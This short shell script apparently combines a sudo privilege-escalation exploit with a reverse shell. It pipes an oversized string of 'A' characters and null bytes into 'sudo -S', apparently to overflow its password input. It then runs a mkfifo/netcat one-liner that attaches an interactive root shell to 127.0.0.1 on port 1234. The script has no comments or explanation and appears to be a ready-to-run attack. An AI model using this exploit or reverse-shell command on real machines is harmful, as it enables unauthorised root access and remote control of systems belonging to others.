#!/bin/sh

perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S /bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f"
